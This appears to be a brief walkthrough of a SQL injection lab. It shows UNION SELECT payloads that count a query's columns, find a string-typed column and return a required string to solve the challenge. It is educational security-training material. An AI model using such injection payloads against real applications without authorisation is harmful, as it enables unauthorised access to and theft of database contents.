Pressing one of the categories then appending `'` to the url will cause an `Internal Server Error` so we are sure now there's an sqli.

First we need to find the number of columns in the vulnerable query.

Starting with just one null and appending one every time there's an error we can just do that.
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--       <-- will work
```

Then by testing one by one we can determine which column contains string. 

```
' UNION SELECT 's',NULL,NULL--
' UNION SELECT NULL,'s',NULL--
' UNION SELECT NULL,NULL,'s'--
```

To complete the challenge we need to return a particular string.

```
' UNION SELECT NULL,'nCHaPE',NULL--
```
